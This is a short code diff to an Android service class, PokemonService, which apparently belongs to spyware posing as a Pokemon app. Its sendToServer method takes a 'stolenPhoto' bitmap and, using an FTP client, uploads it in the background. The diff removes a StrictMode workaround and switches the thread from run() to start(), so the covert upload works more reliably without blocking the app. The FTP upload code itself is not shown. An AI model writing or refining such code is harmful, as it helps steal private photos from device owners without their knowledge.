@@ -6,7 +6,6 @@ import android.graphics.Bitmap;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.Parcelable;
-import android.os.StrictMode;
 import android.util.Log;
 
 import org.apache.commons.net.ftp.FTPClient;
@@ -54,11 +53,6 @@ public class PokemonService extends Service {
 
     private void sendToServer(final Bitmap stolenPhoto) {
 
-        if (android.os.Build.VERSION.SDK_INT > 9) {
-            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-            StrictMode.setThreadPolicy(policy);
-        }
-
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -100,6 +94,6 @@ public class PokemonService extends Service {
                     Log.d(TAG, "EXCEPTION IN sendToServer");
                 }
             }
-        }).run();
+        }).start();
     }
 }
